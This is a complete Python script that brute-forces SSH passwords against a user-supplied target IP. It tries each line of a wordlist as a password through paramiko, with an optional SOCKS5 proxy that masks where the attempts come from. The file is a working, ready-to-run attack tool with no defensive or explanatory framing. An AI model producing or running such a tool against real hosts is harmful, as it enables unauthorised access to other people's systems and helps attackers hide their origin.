import paramiko
import socks
import socket

def ssh_bruteforce(target_ip, username, password_list, proxy_info=None):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    if proxy_info:
        socks.set_default_proxy(socks.SOCKS5, proxy_info['proxy_ip'], int(proxy_info['proxy_port']))
        socket.socket = socks.socksocket

    with open(password_list, 'r') as passwords:
        for password in passwords:
            password = password.strip()
            try:
                ssh.connect(target_ip, username=username, password=password)
                print(f"[+] Password found: {password}")
                return
            except paramiko.AuthenticationException:
                print(f"[-] Failed attempt: {password}")
            except Exception as e:
                print(f"[!] Error: {str(e)}")

    print("[!] Password not found.")

def main():
    target_ip = input("Enter the target IP address: ")
    username = input("Enter the username: ")
    password_list = input("Enter the path to the wordlist file: ")

    use_proxy = input("Do you want to use a proxy? (y/n): ").lower()
    proxy_info = None

    if use_proxy == 'y':
        proxy_ip = input("Enter the proxy IP address: ")
        proxy_port = input("Enter the proxy port: ")
        proxy_info = {'proxy_ip': proxy_ip, 'proxy_port': proxy_port}

    ssh_bruteforce(target_ip, username, password_list, proxy_info)

if __name__ == "__main__":
    main()
